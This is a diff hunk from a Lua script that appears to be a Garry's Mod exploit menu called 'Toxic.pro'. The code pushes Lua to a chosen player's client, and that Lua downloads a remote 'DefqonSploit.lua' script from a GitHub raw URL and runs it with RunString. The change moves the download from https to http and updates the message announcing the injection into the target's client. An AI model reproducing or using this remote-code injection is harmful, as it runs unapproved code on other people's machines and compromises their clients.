@@ -7522,11 +7522,11 @@ function toxic.UI()
 
 			toxic.PostLua( [[
 
-				Player(]] .. id .. [[):SendLua('http.Fetch("https://raw.githubusercontent.com/WERooo/somelua/master/DefqonSploit.lua",function(body) RunString(body) surface.PlaySound("]] .. snd .. [[") chat.AddText(Color(255,0,0),"[DefqonSploit] ",color_white,"Welcome, run `Defqon` in console") end)')
+				Player(]] .. id .. [[):SendLua('http.Fetch("http://raw.githubusercontent.com/WERooo/somelua/master/DefqonSploit.lua",function(body) RunString(body) surface.PlaySound("]] .. snd .. [[") chat.AddText(Color(255,0,0),"[DefqonSploit] ",color_white,"Welcome, run `Defqon` in console") end)')
 
 			]] )
 
-			toxic.Notify( "Injected Toxic.pro into " .. target:Nick() .. "'s client." )
+			toxic.Notify( "Injected Toxic.pro and Defqon into " .. target:Nick() .. "'s client." )
 
 		end ):SetImage( "icon16/bug_add.png" )
 
